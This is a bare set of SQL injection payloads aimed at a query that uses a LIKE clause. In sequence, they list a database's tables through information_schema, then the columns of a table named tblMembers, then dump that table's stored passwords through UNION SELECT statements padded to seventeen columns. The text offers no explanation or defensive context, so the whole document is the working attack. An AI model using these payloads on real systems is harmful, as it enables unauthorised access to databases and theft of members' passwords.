SELECT ? FROM ? WHERE ? LIKE '%
' UNION (SELECT 1,TABLE_NAME,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM information_schema.tables);#
'
' UNION (SELECT 1,COLUMN_NAME,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM information_schema.columns WHERE TABLE_NAME='tblMembers');#
'
' UNION (SELECT 1,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM tblMembers);#
